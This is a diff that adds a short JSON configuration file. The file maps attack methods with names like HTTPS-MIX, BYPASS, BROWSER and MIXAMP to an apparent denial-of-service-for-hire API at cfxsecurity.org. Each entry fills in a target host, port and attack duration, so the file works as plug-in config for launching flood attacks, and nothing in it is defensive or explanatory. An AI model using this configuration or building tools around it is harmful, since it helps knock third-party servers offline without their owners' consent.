@@ -1,0 +1,14 @@
+{
+    "HTTPS": {
+        "api": "https://cfxsecurity.org/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!HTTPS-MIX"
+    },
+    "TLSV2": {
+        "api": "https://cfxsecurity.org/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!BYPASS"
+    },
+    "HTTP-BROWSER": {
+        "api": "https://cfxsecurity.org/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!BROWSER"
+    },
+    "MIX-AMP": {
+        "api": "https://cfxsecurity.org/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!MIXAMP"
+    }
+}
